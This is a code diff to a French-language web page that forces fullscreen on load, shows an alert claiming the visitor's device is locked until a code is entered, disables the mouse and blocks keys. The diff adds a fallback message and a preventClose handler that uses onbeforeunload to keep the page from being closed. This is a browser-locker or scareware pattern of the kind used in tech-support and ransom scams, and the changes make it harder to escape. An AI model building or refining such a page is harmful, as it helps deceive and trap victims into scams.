@@ -89,11 +89,11 @@
             let elem = document.documentElement;  
             if (elem.requestFullscreen) {  
                 elem.requestFullscreen();  
-            } else if (elem.mozRequestFullScreen) {  
+            } else if (elem.mozRequestFullScreen) { // Firefox  
                 elem.mozRequestFullScreen();  
-            } else if (elem.webkitRequestFullscreen) {  
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari et Opera  
                 elem.webkitRequestFullscreen();  
-            } else if (elem.msRequestFullscreen) {  
+            } else if (elem.msRequestFullscreen) { // IE/Edge  
                 elem.msRequestFullscreen();  
             }  
         }  
@@ -101,9 +101,16 @@
         // Affichage d'un message d'alerte après le chargement  
         window.onload = function() {  
             openFullscreen(); // Force le mode plein écran  
-            alert("Attention : Votre appareil est verrouillé ! Pour déverrouiller, veuillez entrer le code.");  
+
+            if (document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled) {  
+                alert("Attention : Votre appareil est verrouillé ! Pour déverrouiller, veuillez entrer le code.");  
+            } else {  
+                alert("Impossible d'entrer en plein écran. Essayez de changer votre navigateur.");  
+            }  
+
             document.getElementById('codeInput').focus(); // Focus automatique sur le champ  
-            disableMouse(); // Désactivate souris  
+            disableMouse(); // Désactivation de la souris  
+            preventClose(); // Lancer la prévention de la fermeture  
         }  
 
         // Désactivation des événements de souris  
@@ -140,6 +147,13 @@
                 }  
             }  
         });  
+
+        // Fonction pour empêcher la fermeture de la page  
+        function preventClose() {  
+            window.onbeforeunload = function() {  
+                return "Êtes-vous sûr de vouloir quitter ?"; // Affiche un message de confirmation  
+            };  
+        }  
 
         // Bloquer les interactions avec certaines touches  
         document.addEventListener("keydown", function(event) {  
